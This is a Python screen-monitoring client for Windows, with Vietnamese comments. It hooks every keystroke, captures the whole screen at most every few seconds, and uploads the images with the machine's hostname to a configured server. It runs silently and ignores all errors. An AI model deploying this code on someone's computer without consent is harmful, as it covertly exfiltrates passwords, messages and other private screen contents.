"""
CapScreen Client - Windows
Chụp màn hình khi gõ phím và gửi về server
"""

import os
import time
import requests
import pyautogui
import json
import socket
import uuid
from datetime import datetime
from pynput import keyboard

import sys

# Đọc cấu hình
if getattr(sys, 'frozen', False):
    application_path = os.path.dirname(sys.executable)
else:
    application_path = os.path.dirname(os.path.abspath(__file__))

CONFIG_FILE = os.path.join(application_path, 'config.json')

def load_config():
    """Đọc hoặc tạo config"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            pass # Nếu lỗi đọc, dùng mặc định
            
    # Config mặc định
    config = {
        'server_url': 'http://192.168.1.100:5000/api/upload',
        'client_id': str(uuid.uuid4()),
        'client_name': socket.gethostname(),
        'cooldown': 5
    }
    
    # Thử lưu config, nếu không được (do quyền admin) thì thôi, dùng RAM
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=2)
    except:
        pass
        
    return config

config = load_config()

# Tạo UUID nếu client_id là auto-generated
if config.get('client_id') == 'auto-generated':
    config['client_id'] = str(uuid.uuid4())
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(config, f, indent=2)
    except:
        pass

SERVER_URL = config['server_url']
CLIENT_ID = config['client_id']
CLIENT_NAME = config['client_name']
COOLDOWN = config['cooldown']

# Tạo thư mục temp
TEMP_FOLDER = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'CapScreenTemp')
os.makedirs(TEMP_FOLDER, exist_ok=True)

# Biến tracking
last_screenshot_time = 0

def take_screenshot():
    """Chụp màn hình"""
    try:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = os.path.join(TEMP_FOLDER, f'screenshot_{timestamp}.png')
        
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        screenshot.close()
        
        return filename
    except:
        return None

def upload_screenshot(filename):
    """Upload ảnh lên server"""
    if not filename or not os.path.exists(filename):
        return False
    
    try:
        with open(filename, 'rb') as f:
            files = {'screenshot': f}
            data = {
                'client_id': CLIENT_ID,
                'client_name': CLIENT_NAME,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
            response = requests.post(SERVER_URL, files=files, data=data, timeout=30)
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    # Xóa file temp
                    try:
                        os.remove(filename)
                    except:
                        pass
                    return True
        
        return False
    except:
        return False

def on_key_press(key):
    """Callback khi nhấn phím"""
    global last_screenshot_time
    
    current_time = time.time()
    
    # Kiểm tra cooldown
    if current_time - last_screenshot_time < COOLDOWN:
        return
    
    # Cập nhật thời gian
    last_screenshot_time = current_time
    
    # Chụp và upload
    filename = take_screenshot()
    if filename:
        upload_screenshot(filename)

def main():
    """Main function"""
    # Lắng nghe keyboard
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == '__main__':
    main()
